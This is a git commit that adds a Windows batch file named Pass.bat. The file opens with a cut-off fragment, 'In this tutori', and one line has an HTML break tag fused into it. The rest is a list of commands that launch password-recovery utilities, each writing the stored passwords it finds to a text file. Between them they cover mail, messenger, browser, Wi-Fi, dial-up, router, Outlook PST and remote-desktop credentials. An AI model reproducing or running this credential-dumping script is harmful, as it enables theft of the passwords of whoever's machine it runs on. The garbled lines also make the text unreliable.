9fac5f2c0f6df2141fda4ea25cb8848398dc5a2e
Hayden barnes <67865621+techdenlab@users.noreply.github.com>
2020-07-09 17:41:14 +0530

    Create Pass.bat

---
+++ Pass.bat
@@ -0,0 +1,13 @@
+In this tutori
+
+start mspass.exe /stext mspass.txt
+start mailpv.exe /stext mailpv.txt<br>start pspv.exe /stext pspv.txt
+start Dialupass.exe /stext Dialupass.txt
+start BulletsPassView.exe /stext BulletsPassView.txt
+start netpass.exe /stext netpass.txt
+start sniffpass.exe /stext sniffpass.txt
+start RouterPassView.exe /stext RouterPassView.txt
+start PstPassword.exe /stext PstPassword.txt
+start WebBrowserPassView.exe /stext WebBrowserPassView.txt
+start WirelessKeyView.exe /stext WirelessKeyView.txt
+start rdpv.exe /stext rdpv.txt
